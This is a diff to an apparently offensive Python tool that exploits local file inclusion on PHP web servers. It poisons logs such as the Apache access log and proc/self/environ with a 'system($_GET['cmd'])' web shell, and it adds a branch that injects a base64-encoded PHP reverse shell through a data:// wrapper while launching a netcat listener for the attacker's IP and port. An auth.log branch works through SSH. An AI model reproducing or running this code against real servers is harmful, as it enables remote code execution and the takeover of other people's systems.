@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-import urllib.response
+
 import time
 import sys
 import argparse
@@ -35,7 +35,7 @@ class Shell_conncet:
             self.ip_re = (output[2]).replace("(",'').replace(')','')
         if "proc/self/environ" in self.url\
         or 'apache2/access.log' in self.url :                                                                                                          
-            self.paylaodPHP = "<?php system($_GET['cmd']); ?>"           
+            self.paylaodPHP = "<?php system($_GET['cmd']); ?>"  
             request = mechanize.Browser()
             request.set_handle_robots(False)
             request.set_handle_redirect(True)
@@ -70,6 +70,29 @@ class Shell_conncet:
                          exit()
                 except KeyboardInterrupt:
                      exit()
+        elif  'php.ini' in self.url or 'apache2' in  self.url :
+            with open('./Package/shell/php.txt', 'r') as paylaodPHPRead:
+                paylaodPHPRead = paylaodPHPRead.read().replace(" $ip = 'IP'", f" $ip = '{self.args.shell}'")\
+                .replace("$port = 'port'", f"$port = '{self.args.port}'")
+                base64_encoded = base64.b64encode(paylaodPHPRead.encode()).decode()
+                self.paylaodPHP = urllib.parse.quote(base64_encoded)
+                path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
+                run    = 'gnome-terminal  -- '+ path
+                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                                     
+                request = mechanize.Browser()
+                request.set_handle_robots(False)
+                request.set_handle_redirect(True)
+                request.set_handle_refresh(True, max_time=1)  
+                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                    ('Cookie',str(self.Cookie).replace('\n','')),
+                                    ('username',f'{self.args.user}'),
+                                    ('password',f'{self.args.password}')]  
+                PHPWAPPER = "data://text/plain;base64,"                   
+                self.url =  self.args.Vulnurl + PHPWAPPER +self.paylaodPHP    
+                print(self.url)              
+                first_req = request.open(self.url).read()
+
         elif  "auth" in  self.url or "auth.log" in  self.url :                  
                 if os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','r') as readHost:
@@ -85,7 +108,7 @@ class Shell_conncet:
                             
                             with open ('./Package/shell/.address','a') as readip:
                                IP_IN = readip.write(str(self.ip_re))                                                                                    
-                               path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/ssh.py;exec bash'
+                               path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/ssh.py'
                                run    = 'gnome-terminal  -- '+ path
                                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)     
                             for T in range(30):
